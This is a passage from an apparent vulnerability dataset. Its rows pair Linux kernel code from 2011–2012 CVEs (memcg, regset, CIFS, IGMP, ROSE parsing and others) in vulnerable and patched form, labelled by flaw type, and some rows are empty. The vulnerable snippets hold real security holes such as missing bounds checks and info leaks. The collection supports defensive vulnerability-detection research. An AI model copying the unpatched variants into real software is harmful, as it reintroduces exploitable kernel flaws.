static inline int pmd_none_or_trans_huge_or_clear_bad(pmd_t *pmd)
{
 /* depend on compiler for an atomic pmd read */
 pmd_t pmdval = *pmd;
 /*
	 * The barrier will stabilize the pmdval in a register or on
	 * the stack so that it will stop changing under the code.
 */
#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 barrier();
#endif
 if (pmd_none(pmdval))
 return 1;
 if (unlikely(pmd_bad(pmdval))) {
 if (!pmd_trans_huge(pmdval))
 pmd_clear_bad(pmd);
 return 1;
	}
 return 0;
}

/*
 * This is a noop if Transparent Hugepage Support is not built into
 * the kernel. Otherwise it is equivalent to
 * pmd_none_or_trans_huge_or_clear_bad(), and shall only be called in
 * places that already verified the pmd is not none and they want to
 * walk ptes while holding the mmap sem in read mode (write mode don't
 * need this). If THP is not enabled, the pmd can't go away under the
 * code even if MADV_DONTNEED runs, but if THP is enabled we need to
 * run a pmd_trans_unstable before walking the ptes after
 * split_huge_page_pmd returns (because it may have run when the pmd
 * become null, but then a page fault can map in a THP and not a
 * regular page).
 */
static inline int pmd_trans_unstable(pmd_t *pmd)
{
#ifdef CONFIG_TRANSPARENT_HUGEPAGE
 return pmd_none_or_trans_huge_or_clear_bad(pmd);
#else
 return 0;
#endif
}

#endif /* CONFIG_MMU */

#endif /* !__ASSEMBLY__ */

 spinlock_t *ptl;

 split_huge_page_pmd(walk->mm, pmd);
 if (pmd_trans_unstable(pmd))
 return 0;

	pte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);
 for (; addr != end; pte++, addr += PAGE_SIZE)
 spinlock_t *ptl;

 split_huge_page_pmd(walk->mm, pmd);
 if (pmd_trans_unstable(pmd))
 return 0;
retry:
	pte = pte_offset_map_lock(vma->vm_mm, pmd, addr, &ptl);
 for (; addr != end; addr += PAGE_SIZE) {
 do {
		next = pmd_addr_end(addr, end);
 if (pmd_trans_huge(*pmd)) {
 if (next - addr != HPAGE_PMD_SIZE) {
 VM_BUG_ON(!rwsem_is_locked(&tlb->mm->mmap_sem));
 split_huge_page_pmd(vma->vm_mm, pmd);
			} else if (zap_huge_pmd(tlb, vma, pmd, addr))
 goto next;
 /* fall through */
		}
 /*
		 * Here there can be other concurrent MADV_DONTNEED or
		 * trans huge page faults running, and if the pmd is
		 * none or trans huge it can change under us. This is
		 * because MADV_DONTNEED holds the mmap_sem in read
		 * mode.
 */
 if (pmd_none_or_trans_huge_or_clear_bad(pmd))
 goto next;
		next = zap_pte_range(tlb, vma, pmd, addr, next, details);
next:
 cond_resched();
	} while (pmd++, addr = next, addr != end);

 do {
		next = pmd_addr_end(addr, end);
 split_huge_page_pmd(vma->vm_mm, pmd);
 if (pmd_none_or_trans_huge_or_clear_bad(pmd))
 continue;
 if (check_pte_range(vma, pmd, addr, next, nodes,
				    flags, private))
			}
 /* fall through */
		}
 if (pmd_none_or_trans_huge_or_clear_bad(pmd))
 mincore_unmapped_range(vma, addr, next, vec);
 else
 mincore_pte_range(vma, pmd, addr, next, vec);
 continue;

 split_huge_page_pmd(walk->mm, pmd);
 if (pmd_none_or_trans_huge_or_clear_bad(pmd))
 goto again;
		err = walk_pte_range(pmd, addr, next, walk);
 if (err)
	pmd = pmd_offset(pud, addr);
 do {
		next = pmd_addr_end(addr, end);
 if (pmd_none_or_trans_huge_or_clear_bad(pmd))


 continue;
		ret = unuse_pte_range(vma, pmd, addr, next, entry, page);
 if (ret)
"
2012,DoS ,CVE-2012-1146," */
 BUG_ON(!thresholds);




	usage = mem_cgroup_usage(memcg, type == _MEMSWAP);

 /* Check if a threshold crossed before removing */

 /* To be sure that nobody uses thresholds */
 synchronize_rcu();

 mutex_unlock(&memcg->thresholds_lock);
}

"," */
 BUG_ON(!thresholds);

 if (!thresholds->primary)
 goto unlock;

	usage = mem_cgroup_usage(memcg, type == _MEMSWAP);

 /* Check if a threshold crossed before removing */

 /* To be sure that nobody uses thresholds */
 synchronize_rcu();
unlock:
 mutex_unlock(&memcg->thresholds_lock);
}

"
2012,DoS ,CVE-2012-1097," for (i = 1; i < view->n; ++i) {
 const struct user_regset *regset = &view->regsets[i];
 do_thread_regset_writeback(t->task, regset);
 if (regset->core_note_type &&
		    (!regset->active || regset->active(t->task, regset))) {
 int ret;
 size_t size = regset->n * regset->size;
{
 const struct user_regset *regset = &view->regsets[setno];




 if (!access_ok(VERIFY_WRITE, data, size))
 return -EIO;

{
 const struct user_regset *regset = &view->regsets[setno];




 if (!access_ok(VERIFY_READ, data, size))
 return -EIO;

"," for (i = 1; i < view->n; ++i) {
 const struct user_regset *regset = &view->regsets[i];
 do_thread_regset_writeback(t->task, regset);
 if (regset->core_note_type && regset->get &&
		    (!regset->active || regset->active(t->task, regset))) {
 int ret;
 size_t size = regset->n * regset->size;
{
 const struct user_regset *regset = &view->regsets[setno];

 if (!regset->get)
 return -EOPNOTSUPP;

 if (!access_ok(VERIFY_WRITE, data, size))
 return -EIO;

{
 const struct user_regset *regset = &view->regsets[setno];

 if (!regset->set)
 return -EOPNOTSUPP;

 if (!access_ok(VERIFY_READ, data, size))
 return -EIO;

"
2012,DoS ,CVE-2012-1090,"			 * If either that or op not supported returned, follow
			 * the normal lookup.
 */
 if ((rc == 0) || (rc == -ENOENT))













				posix_open = true;
 else if ((rc == -EINVAL) || (rc != -EOPNOTSUPP))


				pTcon->broken_posix_open = true;

		}
 if (!posix_open)
			rc = cifs_get_inode_info_unix(&newInode, full_path,
","			 * If either that or op not supported returned, follow
			 * the normal lookup.
 */
 switch (rc) {
 case 0:
 /*
				 * The server may allow us to open things like
				 * FIFOs, but the client isn't set up to deal
				 * with that. If it's not a regular file, just
				 * close it and proceed as if it were a normal
				 * lookup.
 */
 if (newInode && !S_ISREG(newInode->i_mode)) {
 CIFSSMBClose(xid, pTcon, fileHandle);
 break;
				}
 case -ENOENT:
				posix_open = true;
 case -EOPNOTSUPP:
 break;
 default:
				pTcon->broken_posix_open = true;
			}
		}
 if (!posix_open)
			rc = cifs_get_inode_info_unix(&newInode, full_path,
"
2012,#NAME?,CVE-2012-0957," * Work around broken programs that cannot handle ""Linux 3.0"".
 * Instead we map 3.x to 2.6.40+x, so e.g. 3.0 would be 2.6.40
 */
static int override_release(char __user *release, int len)
{
 int ret = 0;
 char buf[65];

 if (current->personality & UNAME26) {
 char *rest = UTS_RELEASE;

 int ndots = 0;
 unsigned v;


 while (*rest) {
 if (*rest == '.' && ++ndots >= 3)
			rest++;
		}
		v = ((LINUX_VERSION_CODE >> 8) & 0xff) + 40;
 snprintf(buf, len, ""2.6.%u%s"", v, rest);
		ret = copy_to_user(release, buf, len);

	}
 return ret;
}
"," * Work around broken programs that cannot handle ""Linux 3.0"".
 * Instead we map 3.x to 2.6.40+x, so e.g. 3.0 would be 2.6.40
 */
static int override_release(char __user *release, size_t len)
{
 int ret = 0;


 if (current->personality & UNAME26) {
 const char *rest = UTS_RELEASE;
 char buf[65] = { 0 };
 int ndots = 0;
 unsigned v;
 size_t copy;

 while (*rest) {
 if (*rest == '.' && ++ndots >= 3)
			rest++;
		}
		v = ((LINUX_VERSION_CODE >> 8) & 0xff) + 40;
		copy = min(sizeof(buf), max_t(size_t, 1, len));
		copy = scnprintf(buf, copy, ""2.6.%u%s"", v, rest);
		ret = copy_to_user(release, buf, copy + 1);
	}
 return ret;
}
"
2012,DoS ,CVE-2012-0879,"			ioc->aic->exit(ioc->aic);
 cfq_exit(ioc);

 put_io_context(ioc);
	}

}

struct io_context *alloc_io_context(gfp_t gfp_flags, int node)
","			ioc->aic->exit(ioc->aic);
 cfq_exit(ioc);


	}
 put_io_context(ioc);
}

struct io_context *alloc_io_context(gfp_t gfp_flags, int node)
"
2020,DoS ,CVE-2012-0810,,
2012,DoS ,CVE-2012-0207,"		 * to be intended in a v3 query.
 */
		max_delay = IGMPV3_MRC(ih3->code)*(HZ/IGMP_TIMER_SCALE);


	} else { /* v3 */
 if (!pskb_may_pull(skb, sizeof(struct igmpv3_query)))
 return;
","		 * to be intended in a v3 query.
 */
		max_delay = IGMPV3_MRC(ih3->code)*(HZ/IGMP_TIMER_SCALE);
 if (!max_delay)
			max_delay = 1;	/* can't mod w/ 0 */
	} else { /* v3 */
 if (!pskb_may_pull(skb, sizeof(struct igmpv3_query)))
 return;
"
2012,DoS ,CVE-2012-0058,"	batch->count = total;
}

static void kiocb_batch_free(struct kiocb_batch *batch)
{
 struct kiocb *req, *n;





 list_for_each_entry_safe(req, n, &batch->head, ki_batch) {
 list_del(&req->ki_batch);

 kmem_cache_free(kiocb_cachep, req);

	}

}

/*
	}
 blk_finish_plug(&plug);

 kiocb_batch_free(&batch);
 put_ioctx(ctx);
 return i ? i : ret;
}
","	batch->count = total;
}

static void kiocb_batch_free(struct kioctx *ctx, struct kiocb_batch *batch)
{
 struct kiocb *req, *n;

 if (list_empty(&batch->head))
 return;

 spin_lock_irq(&ctx->ctx_lock);
 list_for_each_entry_safe(req, n, &batch->head, ki_batch) {
 list_del(&req->ki_batch);
 list_del(&req->ki_list);
 kmem_cache_free(kiocb_cachep, req);
		ctx->reqs_active--;
	}
 spin_unlock_irq(&ctx->ctx_lock);
}

/*
	}
 blk_finish_plug(&plug);

 kiocb_batch_free(ctx, &batch);
 put_ioctx(ctx);
 return i ? i : ret;
}
"
2012,#NAME?,CVE-2012-0056,,
2020,Bypass ,CVE-2012-0055,,
2012,DoS ,CVE-2012-0045,"#define X86EMUL_MODE_PROT     (X86EMUL_MODE_PROT16|X86EMUL_MODE_PROT32| \
			       X86EMUL_MODE_PROT64)














enum x86_intercept_stage {
	X86_ICTP_NONE = 0,   /* Allow zero-init to not match anything */
	X86_ICPT_PRE_EXCEPT,
	ss->p = 1;
}














































static int em_syscall(struct x86_emulate_ctxt *ctxt)
{
 struct x86_emulate_ops *ops = ctxt->ops;
	    ctxt->mode == X86EMUL_MODE_VM86)
 return emulate_ud(ctxt);




	ops->get_msr(ctxt, MSR_EFER, &efer);
 setup_syscalls_segments(ctxt, &cs, &ss);




	ops->get_msr(ctxt, MSR_STAR, &msr_data);
	msr_data >>= 32;
	cs_sel = (u16)(msr_data & 0xfffc);
","#define X86EMUL_MODE_PROT     (X86EMUL_MODE_PROT16|X86EMUL_MODE_PROT32| \
			       X86EMUL_MODE_PROT64)

/* CPUID vendors */
#define X86EMUL_CPUID_VENDOR_AuthenticAMD_ebx 0x68747541
#define X86EMUL_CPUID_VENDOR_AuthenticAMD_ecx 0x444d4163
#define X86EMUL_CPUID_VENDOR_AuthenticAMD_edx 0x69746e65

#define X86EMUL_CPUID_VENDOR_AMDisbetterI_ebx 0x69444d41
#define X86EMUL_CPUID_VENDOR_AMDisbetterI_ecx 0x21726574
#define X86EMUL_CPUID_VENDOR_AMDisbetterI_edx 0x74656273

#define X86EMUL_CPUID_VENDOR_GenuineIntel_ebx 0x756e6547
#define X86EMUL_CPUID_VENDOR_GenuineIntel_ecx 0x6c65746e
#define X86EMUL_CPUID_VENDOR_GenuineIntel_edx 0x49656e69

enum x86_intercept_stage {
	X86_ICTP_NONE = 0,   /* Allow zero-init to not match anything */
	X86_ICPT_PRE_EXCEPT,
	ss->p = 1;
}

static bool em_syscall_is_enabled(struct x86_emulate_ctxt *ctxt)
{
 struct x86_emulate_ops *ops = ctxt->ops;
	u32 eax, ebx, ecx, edx;

 /*
	 * syscall should always be enabled in longmode - so only become
	 * vendor specific (cpuid) if other modes are active...
 */
 if (ctxt->mode == X86EMUL_MODE_PROT64)
 return true;

	eax = 0x00000000;
	ecx = 0x00000000;
 if (ops->get_cpuid(ctxt, &eax, &ebx, &ecx, &edx)) {
 /*
		 * Intel (""GenuineIntel"")
		 * remark: Intel CPUs only support ""syscall"" in 64bit
		 * longmode. Also an 64bit guest with a
		 * 32bit compat-app running will #UD !! While this
		 * behaviour can be fixed (by emulating) into AMD
		 * response - CPUs of AMD can't behave like Intel.
 */
 if (ebx == X86EMUL_CPUID_VENDOR_GenuineIntel_ebx &&
		    ecx == X86EMUL_CPUID_VENDOR_GenuineIntel_ecx &&
		    edx == X86EMUL_CPUID_VENDOR_GenuineIntel_edx)
 return false;

 /* AMD (""AuthenticAMD"") */
 if (ebx == X86EMUL_CPUID_VENDOR_AuthenticAMD_ebx &&
		    ecx == X86EMUL_CPUID_VENDOR_AuthenticAMD_ecx &&
		    edx == X86EMUL_CPUID_VENDOR_AuthenticAMD_edx)
 return true;

 /* AMD (""AMDisbetter!"") */
 if (ebx == X86EMUL_CPUID_VENDOR_AMDisbetterI_ebx &&
		    ecx == X86EMUL_CPUID_VENDOR_AMDisbetterI_ecx &&
		    edx == X86EMUL_CPUID_VENDOR_AMDisbetterI_edx)
 return true;
	}

 /* default: (not Intel, not AMD), apply Intel's stricter rules... */
 return false;
}

static int em_syscall(struct x86_emulate_ctxt *ctxt)
{
 struct x86_emulate_ops *ops = ctxt->ops;
	    ctxt->mode == X86EMUL_MODE_VM86)
 return emulate_ud(ctxt);

 if (!(em_syscall_is_enabled(ctxt)))
 return emulate_ud(ctxt);

	ops->get_msr(ctxt, MSR_EFER, &efer);
 setup_syscalls_segments(ctxt, &cs, &ss);

 if (!(efer & EFER_SCE))
 return emulate_ud(ctxt);

	ops->get_msr(ctxt, MSR_STAR, &msr_data);
	msr_data >>= 32;
	cs_sel = (u16)(msr_data & 0xfffc);
"
2012,DoS Overflow +Priv Mem. Corr. ,CVE-2012-0044,"	}

 if (num_clips && clips_ptr) {




		clips = kzalloc(num_clips * sizeof(*clips), GFP_KERNEL);
 if (!clips) {
			ret = -ENOMEM;
#define DRM_MODE_FB_DIRTY_ANNOTATE_FILL 0x02
#define DRM_MODE_FB_DIRTY_FLAGS 0x03



/*
 * Mark a region of a framebuffer as dirty.
 *
","	}

 if (num_clips && clips_ptr) {
 if (num_clips < 0 || num_clips > DRM_MODE_FB_DIRTY_MAX_CLIPS) {
			ret = -EINVAL;
 goto out_err1;
		}
		clips = kzalloc(num_clips * sizeof(*clips), GFP_KERNEL);
 if (!clips) {
			ret = -ENOMEM;
#define DRM_MODE_FB_DIRTY_ANNOTATE_FILL 0x02
#define DRM_MODE_FB_DIRTY_FLAGS 0x03

#define DRM_MODE_FB_DIRTY_MAX_CLIPS 256

/*
 * Mark a region of a framebuffer as dirty.
 *
"
2012,DoS Overflow ,CVE-2012-0038," int count, i;

	count = be32_to_cpu(aclp->acl_cnt);



	acl = posix_acl_alloc(count, GFP_KERNEL);
 if (!acl)
"," int count, i;

	count = be32_to_cpu(aclp->acl_cnt);
 if (count > XFS_ACL_MAX_ENTRIES)
 return ERR_PTR(-EFSCORRUPTED);

	acl = posix_acl_alloc(count, GFP_KERNEL);
 if (!acl)
"
2012,DoS +Priv ,CVE-2012-0028,"#include <linux/cn_proc.h>
#include <linux/mutex.h>
#include <linux/futex.h>
#include <linux/compat.h>
#include <linux/pipe_fs_i.h>
#include <linux/audit.h> /* for audit_free() */
#include <linux/resource.h>
 exit_itimers(tsk->signal);
	}
 acct_collect(code, group_dead);
#ifdef CONFIG_FUTEX
 if (unlikely(tsk->robust_list))
 exit_robust_list(tsk);
#ifdef CONFIG_COMPAT
 if (unlikely(tsk->compat_robust_list))
 compat_exit_robust_list(tsk);
#endif
#endif
 if (group_dead)
 tty_audit_exit();
 if (unlikely(tsk->audit_context))
#include <linux/jiffies.h>
#include <linux/tracehook.h>
#include <linux/futex.h>

#include <linux/task_io_accounting_ops.h>
#include <linux/rcupdate.h>
#include <linux/ptrace.h>
{
 struct completion *vfork_done = tsk->vfork_done;











 /* Get rid of any cached register state */
 deactivate_mm(tsk, mm);

","#include <linux/cn_proc.h>
#include <linux/mutex.h>
#include <linux/futex.h>

#include <linux/pipe_fs_i.h>
#include <linux/audit.h> /* for audit_free() */
#include <linux/resource.h>
 exit_itimers(tsk->signal);
	}
 acct_collect(code, group_dead);








 if (group_dead)
 tty_audit_exit();
 if (unlikely(tsk->audit_context))
#include <linux/jiffies.h>
#include <linux/tracehook.h>
#include <linux/futex.h>
#include <linux/compat.h>
#include <linux/task_io_accounting_ops.h>
#include <linux/rcupdate.h>
#include <linux/ptrace.h>
{
 struct completion *vfork_done = tsk->vfork_done;

 /* Get rid of any futexes when releasing the mm */
#ifdef CONFIG_FUTEX
 if (unlikely(tsk->robust_list))
 exit_robust_list(tsk);
#ifdef CONFIG_COMPAT
 if (unlikely(tsk->compat_robust_list))
 compat_exit_robust_list(tsk);
#endif
#endif

 /* Get rid of any cached register state */
 deactivate_mm(tsk, mm);

"
2019,Overflow Mem. Corr. ,CVE-2011-5327,"	tpgt_str += 5; /* Skip ahead of ""tpgt_"" */
	tpgt = (unsigned short int) simple_strtoul(tpgt_str, &end_ptr, 0);

 if (tpgt > TL_TPGS_PER_HBA) {
 printk(KERN_ERR ""Passed tpgt: %hu exceeds TL_TPGS_PER_HBA:""
 "" %u\n"", tpgt, TL_TPGS_PER_HBA);
 return ERR_PTR(-EINVAL);
","	tpgt_str += 5; /* Skip ahead of ""tpgt_"" */
	tpgt = (unsigned short int) simple_strtoul(tpgt_str, &end_ptr, 0);

 if (tpgt >= TL_TPGS_PER_HBA) {
 printk(KERN_ERR ""Passed tpgt: %hu exceeds TL_TPGS_PER_HBA:""
 "" %u\n"", tpgt, TL_TPGS_PER_HBA);
 return ERR_PTR(-EINVAL);
"
2016,DoS ,CVE-2011-5321," if (IS_ERR(tty)) {
 tty_unlock();
 mutex_unlock(&tty_mutex);

 return PTR_ERR(tty);
		}
	}
"," if (IS_ERR(tty)) {
 tty_unlock();
 mutex_unlock(&tty_mutex);
 tty_driver_kref_put(driver);
 return PTR_ERR(tty);
		}
	}
"
2020,#NAME?,CVE-2011-4915,,
2012,DoS +Info ,CVE-2011-4914,"
#define ROSE_MIN_LEN 3







#define ROSE_GFI 0x10
#define ROSE_Q_BIT 0x80
#define ROSE_D_BIT 0x40
extern int rose_validate_nr(struct sock *, unsigned short);
extern void rose_write_internal(struct sock *, int);
extern int rose_decode(struct sk_buff *, int *, int *, int *, int *, int *);
extern int rose_parse_facilities(unsigned char *, struct rose_facilities_struct *);
extern void rose_disconnect(struct sock *, int, int, int);

/* rose_timer.c */
 struct sock *make;
 struct rose_sock *make_rose;
 struct rose_facilities_struct facilities;
 int n, len;

	skb->sk = NULL;		/* Initially we don't know who it's for */

 */
 memset(&facilities, 0x00, sizeof(struct rose_facilities_struct));

 len  = (((skb->data[3] >> 4) & 0x0F) + 1) >> 1;
 len += (((skb->data[3] >> 0) & 0x0F) + 1) >> 1;
 if (!rose_parse_facilities(skb->data + len + 4, &facilities)) {
 rose_transmit_clear_request(neigh, lci, ROSE_INVALID_FACILITY, 76);
 return 0;
	}
 unsigned int lci_i, lci_o;

 while ((skb = skb_dequeue(&loopback_queue)) != NULL) {




		lci_i     = ((skb->data[0] << 8) & 0xF00) + ((skb->data[1] << 0) & 0x0FF);
		frametype = skb->data[2];
		dest      = (rose_address *)(skb->data + 4);







		lci_o     = ROSE_DEFAULT_MAXVC + 1 - lci_i;

 skb_reset_transport_header(skb);
 unsigned int lci, new_lci;
 unsigned char cause, diagnostic;
 struct net_device *dev;
 int len, res = 0;
 char buf[11];

#if 0
	if (call_in_firewall(PF_ROSE, skb->dev, skb->data, NULL, &skb) != FW_ACCEPT)
		return res;
#endif



	frametype = skb->data[2];
	lci = ((skb->data[0] << 8) & 0xF00) + ((skb->data[1] << 0) & 0x0FF);
	src_addr  = (rose_address *)(skb->data + 9);
	dest_addr = (rose_address *)(skb->data + 4);






 spin_lock_bh(&rose_neigh_list_lock);
 spin_lock_bh(&rose_route_list_lock);
 goto out;
	}

	len  = (((skb->data[3] >> 4) & 0x0F) + 1) >> 1;
	len += (((skb->data[3] >> 0) & 0x0F) + 1) >> 1;

 memset(&facilities, 0x00, sizeof(struct rose_facilities_struct));

 if (!rose_parse_facilities(skb->data + len + 4, &facilities)) {


 rose_transmit_clear_request(rose_neigh, lci, ROSE_INVALID_FACILITY, 76);
 goto out;
	}
		*dptr++ = ROSE_GFI | lci1;
		*dptr++ = lci2;
		*dptr++ = frametype;
		*dptr++ = 0xAA;
 memcpy(dptr, &rose->dest_addr,  ROSE_ADDR_LEN);
		dptr   += ROSE_ADDR_LEN;
 memcpy(dptr, &rose->source_addr, ROSE_ADDR_LEN);
 do {
 switch (*p & 0xC0) {
 case 0x00:


			p   += 2;
			n   += 2;
			len -= 2;
 break;

 case 0x40:


 if (*p == FAC_NATIONAL_RAND)
				facilities->rand = ((p[1] << 8) & 0xFF00) + ((p[2] << 0) & 0x00FF);
			p   += 3;
 break;

 case 0x80:


			p   += 4;
			n   += 4;
			len -= 4;
 break;

 case 0xC0:


			l = p[1];


 if (*p == FAC_NATIONAL_DEST_DIGI) {
 if (!fac_national_digis_received) {


 memcpy(&facilities->source_digis[0], p + 2, AX25_ADDR_LEN);
					facilities->source_ndigis = 1;
				}
			}
 else if (*p == FAC_NATIONAL_SRC_DIGI) {
 if (!fac_national_digis_received) {


 memcpy(&facilities->dest_digis[0], p + 2, AX25_ADDR_LEN);
					facilities->dest_ndigis = 1;
				}
			}
 else if (*p == FAC_NATIONAL_FAIL_CALL) {


 memcpy(&facilities->fail_call, p + 2, AX25_ADDR_LEN);
			}
 else if (*p == FAC_NATIONAL_FAIL_ADD) {


 memcpy(&facilities->fail_addr, p + 3, ROSE_ADDR_LEN);
			}
 else if (*p == FAC_NATIONAL_DIGIS) {


				fac_national_digis_received = 1;
				facilities->source_ndigis = 0;
				facilities->dest_ndigis   = 0;
 do {
 switch (*p & 0xC0) {
 case 0x00:


			p   += 2;
			n   += 2;
			len -= 2;
 break;

 case 0x40:


			p   += 3;
			n   += 3;
			len -= 3;
 break;

 case 0x80:


			p   += 4;
			n   += 4;
			len -= 4;
 break;

 case 0xC0:


			l = p[1];

 /* Prevent overflows*/
 return n;
}

int rose_parse_facilities(unsigned char *p,
 struct rose_facilities_struct *facilities)
{
 int facilities_len, len;

	facilities_len = *p++;

 if (facilities_len == 0)
 return 0;

 while (facilities_len > 0) {
 if (*p == 0x00) {
			facilities_len--;
			p++;

 switch (*p) {
 case FAC_NATIONAL:		/* National */
				len = rose_parse_national(p + 1, facilities, facilities_len - 1);
 if (len < 0)
 return 0;
				facilities_len -= len + 1;
				p += len + 1;
 break;

 case FAC_CCITT:		/* CCITT */
				len = rose_parse_ccitt(p + 1, facilities, facilities_len - 1);
 if (len < 0)
 return 0;
				facilities_len -= len + 1;
				p += len + 1;
 break;

 default:
 printk(KERN_DEBUG ""ROSE: rose_parse_facilities - unknown facilities family %02X\n"", *p);
				facilities_len--;
				p++;
 break;
			}
		} else
 break;	/* Error in facilities format */
	}

 return 1;
}

static int rose_create_facilities(unsigned char *buffer, struct rose_sock *rose)
","
#define ROSE_MIN_LEN 3

#define ROSE_CALL_REQ_ADDR_LEN_OFF 3
#define ROSE_CALL_REQ_ADDR_LEN_VAL 0xAA /* each address is 10 digits */
#define ROSE_CALL_REQ_DEST_ADDR_OFF 4
#define ROSE_CALL_REQ_SRC_ADDR_OFF 9
#define ROSE_CALL_REQ_FACILITIES_OFF 14

#define ROSE_GFI 0x10
#define ROSE_Q_BIT 0x80
#define ROSE_D_BIT 0x40
extern int rose_validate_nr(struct sock *, unsigned short);
extern void rose_write_internal(struct sock *, int);
extern int rose_decode(struct sk_buff *, int *, int *, int *, int *, int *);
extern int rose_parse_facilities(unsigned char *, unsigned int, struct rose_facilities_struct *);
extern void rose_disconnect(struct sock *, int, int, int);

/* rose_timer.c */
 struct sock *make;
 struct rose_sock *make_rose;
 struct rose_facilities_struct facilities;
 int n;

	skb->sk = NULL;		/* Initially we don't know who it's for */

 */
 memset(&facilities, 0x00, sizeof(struct rose_facilities_struct));

 if (!rose_parse_facilities(skb->data + ROSE_CALL_REQ_FACILITIES_OFF,
  skb->len - ROSE_CALL_REQ_FACILITIES_OFF,
   &facilities)) {
 rose_transmit_clear_request(neigh, lci, ROSE_INVALID_FACILITY, 76);
 return 0;
	}
 unsigned int lci_i, lci_o;

 while ((skb = skb_dequeue(&loopback_queue)) != NULL) {
 if (skb->len < ROSE_MIN_LEN) {
 kfree_skb(skb);
 continue;
		}
		lci_i     = ((skb->data[0] << 8) & 0xF00) + ((skb->data[1] << 0) & 0x0FF);
		frametype = skb->data[2];
 if (frametype == ROSE_CALL_REQUEST &&
		    (skb->len <= ROSE_CALL_REQ_FACILITIES_OFF ||
		     skb->data[ROSE_CALL_REQ_ADDR_LEN_OFF] !=
		     ROSE_CALL_REQ_ADDR_LEN_VAL)) {
 kfree_skb(skb);
 continue;
		}
		dest      = (rose_address *)(skb->data + ROSE_CALL_REQ_DEST_ADDR_OFF);
		lci_o     = ROSE_DEFAULT_MAXVC + 1 - lci_i;

 skb_reset_transport_header(skb);
 unsigned int lci, new_lci;
 unsigned char cause, diagnostic;
 struct net_device *dev;
 int res = 0;
 char buf[11];

#if 0
	if (call_in_firewall(PF_ROSE, skb->dev, skb->data, NULL, &skb) != FW_ACCEPT)
		return res;
#endif

 if (skb->len < ROSE_MIN_LEN)
 return res;
	frametype = skb->data[2];
	lci = ((skb->data[0] << 8) & 0xF00) + ((skb->data[1] << 0) & 0x0FF);
 if (frametype == ROSE_CALL_REQUEST &&
	    (skb->len <= ROSE_CALL_REQ_FACILITIES_OFF ||
	     skb->data[ROSE_CALL_REQ_ADDR_LEN_OFF] !=
	     ROSE_CALL_REQ_ADDR_LEN_VAL))
 return res;
	src_addr  = (rose_address *)(skb->data + ROSE_CALL_REQ_SRC_ADDR_OFF);
	dest_addr = (rose_address *)(skb->data + ROSE_CALL_REQ_DEST_ADDR_OFF);

 spin_lock_bh(&rose_neigh_list_lock);
 spin_lock_bh(&rose_route_list_lock);
 goto out;
	}




 memset(&facilities, 0x00, sizeof(struct rose_facilities_struct));

 if (!rose_parse_facilities(skb->data + ROSE_CALL_REQ_FACILITIES_OFF,
				   skb->len - ROSE_CALL_REQ_FACILITIES_OFF,
				   &facilities)) {
 rose_transmit_clear_request(rose_neigh, lci, ROSE_INVALID_FACILITY, 76);
 goto out;
	}
		*dptr++ = ROSE_GFI | lci1;
		*dptr++ = lci2;
		*dptr++ = frametype;
		*dptr++ = ROSE_CALL_REQ_ADDR_LEN_VAL;
 memcpy(dptr, &rose->dest_addr,  ROSE_ADDR_LEN);
		dptr   += ROSE_ADDR_LEN;
 memcpy(dptr, &rose->source_addr, ROSE_ADDR_LEN);
 do {
 switch (*p & 0xC0) {
 case 0x00:
 if (len < 2)
 return -1;
			p   += 2;
			n   += 2;
			len -= 2;
 break;

 case 0x40:
 if (len < 3)
 return -1;
 if (*p == FAC_NATIONAL_RAND)
				facilities->rand = ((p[1] << 8) & 0xFF00) + ((p[2] << 0) & 0x00FF);
			p   += 3;
 break;

 case 0x80:
 if (len < 4)
 return -1;
			p   += 4;
			n   += 4;
			len -= 4;
 break;

 case 0xC0:
 if (len < 2)
 return -1;
			l = p[1];
 if (len < 2 + l)
 return -1;
 if (*p == FAC_NATIONAL_DEST_DIGI) {
 if (!fac_national_digis_received) {
 if (l < AX25_ADDR_LEN)
 return -1;
 memcpy(&facilities->source_digis[0], p + 2, AX25_ADDR_LEN);
					facilities->source_ndigis = 1;
				}
			}
 else if (*p == FAC_NATIONAL_SRC_DIGI) {
 if (!fac_national_digis_received) {
 if (l < AX25_ADDR_LEN)
 return -1;
 memcpy(&facilities->dest_digis[0], p + 2, AX25_ADDR_LEN);
					facilities->dest_ndigis = 1;
				}
			}
 else if (*p == FAC_NATIONAL_FAIL_CALL) {
 if (l < AX25_ADDR_LEN)
 return -1;
 memcpy(&facilities->fail_call, p + 2, AX25_ADDR_LEN);
			}
 else if (*p == FAC_NATIONAL_FAIL_ADD) {
 if (l < 1 + ROSE_ADDR_LEN)
 return -1;
 memcpy(&facilities->fail_addr, p + 3, ROSE_ADDR_LEN);
			}
 else if (*p == FAC_NATIONAL_DIGIS) {
 if (l % AX25_ADDR_LEN)
 return -1;
				fac_national_digis_received = 1;
				facilities->source_ndigis = 0;
				facilities->dest_ndigis   = 0;
 do {
 switch (*p & 0xC0) {
 case 0x00:
 if (len < 2)
 return -1;
			p   += 2;
			n   += 2;
			len -= 2;
 break;

 case 0x40:
 if (len < 3)
 return -1;
			p   += 3;
			n   += 3;
			len -= 3;
 break;

 case 0x80:
 if (len < 4)
 return -1;
			p   += 4;
			n   += 4;
			len -= 4;
 break;

 case 0xC0:
 if (len < 2)
 return -1;
			l = p[1];

 /* Prevent overflows*/
 return n;
}

int rose_parse_facilities(unsigned char *p, unsigned packet_len,
 struct rose_facilities_struct *facilities)
{
 int facilities_len, len;

	facilities_len = *p++;

 if (facilities_len == 0 || (unsigned)facilities_len > packet_len)
 return 0;

 while (facilities_len >= 3 && *p == 0x00) {
		facilities_len--;
		p++;

 switch (*p) {
 case FAC_NATIONAL:		/* National */
			len = rose_parse_national(p + 1, facilities, facilities_len - 1);
 break;

 case FAC_CCITT:		/* CCITT */
			len = rose_parse_ccitt(p + 1, facilities, facilities_len - 1);
 break;

 default:
 printk(KERN_DEBUG ""ROSE: rose_parse_facilities - unknown facilities family %02X\n"", *p);
			len = 1;
 break;
		}

 if (len < 0)
 return 0;
 if (WARN_ON(len >= facilities_len))
 return 0;
		facilities_len -= len + 1;
		p += len + 1;





	}

 return facilities_len == 0;
}

static int rose_create_facilities(unsigned char *buffer, struct rose_sock *rose)
"
2012,DoS Overflow Mem. Corr. ,CVE-2011-4913,"				facilities->source_ndigis = 0;
				facilities->dest_ndigis   = 0;
 for (pt = p + 2, lg = 0 ; lg < l ; pt += AX25_ADDR_LEN, lg += AX25_ADDR_LEN) {
 if (pt[6] & AX25_HBIT)


 memcpy(&facilities->dest_digis[facilities->dest_ndigis++], pt, AX25_ADDR_LEN);
 else


